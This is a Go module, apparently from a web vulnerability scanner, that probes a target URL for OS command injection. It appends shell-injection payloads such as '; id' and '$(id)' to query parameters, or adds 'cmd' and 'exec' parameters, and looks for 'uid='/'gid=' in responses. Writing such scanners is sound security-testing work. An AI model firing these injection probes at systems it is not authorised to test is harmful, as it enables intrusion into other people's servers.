package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// OSCommandInjectionResult holds the result of the OSCommandInjection module execution.
type OSCommandInjectionResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// OSCommandInjection executes the os_command_injection security technique.
type OSCommandInjection struct {
	Target     string
	Cookies    string
	maxThreads int
	mu         sync.Mutex
	results    []OSCommandInjectionResult
	client     *http.Client
}

// NewOSCommandInjection creates a new instance of OSCommandInjection.
func NewOSCommandInjection(target string) *OSCommandInjection {
	return &OSCommandInjection{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

// SetCookies sets the Cookie header value for the requests.
func (m *OSCommandInjection) SetCookies(cookies string) {
	m.Cookies = cookies
}

func (m *OSCommandInjection) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var osCmdPayloads = []string{
	"; id",
	"| id",
	"`id`",
	"$(id)",
	"& id",
	"&& id",
}

func (m *OSCommandInjection) Execute(ctx context.Context) ([]OSCommandInjectionResult, error) {
	m.results = make([]OSCommandInjectionResult, 0)
	
	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(osCmdPayloads))
	for _, p := range osCmdPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *OSCommandInjection) testPayload(ctx context.Context, u *url.URL, payload string) {
	query := u.Query()
	hasParams := len(query) > 0
	
	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("cmd", payload)
		query.Add("exec", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	if m.Cookies != "" {
		req.Header.Set("Cookie", m.Cookies)
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := string(bodyBytes)

	// 'id' command output typically contains 'uid=' and 'gid='
	if strings.Contains(bodyStr, "uid=") && strings.Contains(bodyStr, "gid=") {
		m.mu.Lock()
		m.results = append(m.results, OSCommandInjectionResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Command execution successful with payload: " + payload,
		})
		m.mu.Unlock()
	}
}
